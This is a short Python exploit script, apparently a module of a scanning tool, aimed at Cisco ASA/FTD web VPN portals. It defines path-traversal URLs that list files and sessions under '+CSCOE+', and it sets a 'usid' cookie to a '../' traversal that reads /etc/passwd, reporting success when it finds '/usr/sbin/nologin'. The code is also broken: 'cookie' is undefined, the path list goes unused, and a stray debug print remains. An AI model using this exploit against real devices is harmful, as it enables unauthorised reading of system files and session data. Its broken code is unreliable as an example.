#!/usr/bin/env python3

from libs import NewRequest as nq
from urllib.parse import urlparse,urljoin
from queue import Queue
from threading import Thread

PATHS = [
    '+CSCOU+/%2e%2e/+CSCOE+/files/file_list.json?path=/',
    '+CSCOU+/%2e%2e/+CSCOE+/files/file_list.json?path=%2bCSCOE%2b',
    '+CSCOU+/%2e%2e/+CSCOE+/files/file_list.json?path=/sessions/',
    '+CSCOE+/logon.html'
]
def run(options):
    for url in options['url']:
        cookie['usid'] = '../../../../../../../../../../../../../etc/passwd'
        nq.Update(cookie=cookie)
        r = nq.Get(url)
        if r != 0:
            if '/usr/sbin/nologin' in r.content.decode():
                print("[+] Read /etc/passwd :)")
        print('hi')